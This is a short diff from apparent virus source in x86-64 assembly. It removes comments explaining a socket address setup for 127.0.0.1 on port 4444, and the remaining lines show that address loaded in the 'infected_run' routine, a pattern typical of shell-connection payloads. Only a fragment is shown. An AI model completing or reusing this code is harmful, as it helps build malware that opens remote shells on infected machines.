@@ -271,15 +271,6 @@ v_start:
     infected_run:
      ; Configuration de sockaddr_struct
 
-    ; struct sockaddr_in {
-    ;     short sin_family;   // 2 bytes
-    ;     unsigned short sin_port; // 2 bytes
-    ;     struct in_addr sin_addr; // 4 bytes
-    ; };
-    ; sin_family = AF_INET (2)
-    ; sin_port = htons(4444) (0x115c)
-    ; sin_addr = inet_addr("127.0.0.1") (0x7f000001)
-
     mov rdi, 0x0100007f5c110002    ; 127.0.0.1:4444, AF_INET
     push rdi
     mov rsi, rsp
